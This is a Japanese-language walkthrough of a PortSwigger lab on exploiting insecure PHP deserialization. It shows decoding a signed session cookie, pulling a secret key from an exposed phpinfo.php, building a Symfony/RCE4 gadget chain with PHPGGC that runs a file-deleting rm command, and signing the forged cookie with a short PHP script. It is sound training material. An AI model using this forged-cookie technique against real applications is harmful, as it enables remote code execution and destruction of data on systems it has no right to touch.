# 事前に構築されたガジェット チェーンを使用した PHP デシリアライゼーションの活用

以下のハッキングラボを実施します  
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain  
このラボには、署名付き Cookie を使用するシリアル化ベースのセッション メカニズムがあります。また、一般的な PHP フレームワークも使用します。ソース コードにアクセスできませんが、事前に構築されたガジェット チェーンを使用して、 このラボの安全でない逆シリアル化を悪用することができます。

- 1. BurpSuite を起動して Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. 一般ユーザーでログインします
- 4. GET /my-account?id=wiener HTTP/2 リクエストを send to repeater します

* 5. クッキーを URL デコード後に、token 部分を base64 でデコードすると、token は PHP オブジェクトであることが確認できます

```
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlYzBtOGl3ZjMxZTB3czJyOTFvZWs5bm1kcTdlNHZ1NiI7fQ==","sig_hmac_sha1":"796c5520b86aa0cde95f0e5240b9a24d11518a52"}
```

```
{"token":"O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ec0m8iwf31e0ws2r91oek9nmdq7e4vu6";}","sig_hmac_sha1":"796c5520b86aa0cde95f0e5240b9a24d11518a52"}
```

- 6. 手順 4 のレスポンスを見るとデバッグ用 php ファイルが見つかります

```
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```

- 7. php ファイルにアクセスすると secret_key が確認できます

```
SECRET_KEY	4hugqo7k67ilzyknpcguvi1eiuyuhq8m
```

- 8. PHPGGC ツールをダウンロードして以下のコマンドを実行。
     carlos のファイルを削除するコマンドオブジェクトを生成します。

```
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```

- 9. 以下のスクリプトで上記オブジェクトに署名します

```
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

- 10. クッキーが出力されるので、これを repeter に送ったリクエストのクッキーに設定して送信します
